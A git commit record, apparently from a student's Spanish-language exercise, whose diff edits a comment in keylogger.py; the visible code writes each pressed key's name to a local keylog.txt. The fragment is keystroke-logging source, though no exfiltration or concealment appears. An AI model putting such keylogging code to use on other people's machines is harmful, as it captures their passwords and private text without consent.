f1ac1590cfc189f9a592ca1084ec40bdc4a431f6
Dmarmun <dmarmun0704@g.educaand.es>
2025-01-24 12:44:04 +0100

    minor change

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,7 @@ import keyboard
 # Estas lineas hacen que el archivo de texto se limpie cada vez que se ejecute el programa ya que el argumento w es sobreescritura siempre que el archivo ya exista, si no, creará el archivo
 with open("keylog.txt", "w") as log_file:
     log_file.write("")
-# Creo una funcion que se encargara de guardar las teclas pulsadas en el archivo de texto
+# Creo una funcion que se encargara de guardar las teclas pulsadas en el archivo de texto usando el argumento a que es para añadir al final del archivo en vez de sobreescribirlo
 def iniciar_keylogger(tecla):
     with open("keylog.txt", "a") as log_file:
         log_file.write(f"{tecla.name} ")
